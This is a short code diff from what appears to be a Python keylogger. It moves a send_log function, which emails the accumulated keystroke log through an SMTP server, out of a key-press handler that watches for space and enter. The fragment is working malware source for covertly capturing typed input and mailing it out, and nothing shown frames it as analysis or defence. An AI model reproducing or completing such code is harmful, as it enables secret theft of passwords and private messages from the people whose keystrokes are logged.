@@ -32,17 +32,19 @@ word = ''
 email_char_limit = 50
 
 
+def send_log():server.sendmail(
+        email,
+        email,
+        full_log
+  )
+
 def on_press(key):
     global word
     global full_log
     global email
     global email_char_limit
       
-     def send_log():server.sendmail(
-        email,
-        email,
-        full_log
-    )
+
 
     # condition if user presses the enter key or spce bar
     if key == Key.space or key == Key.enter:
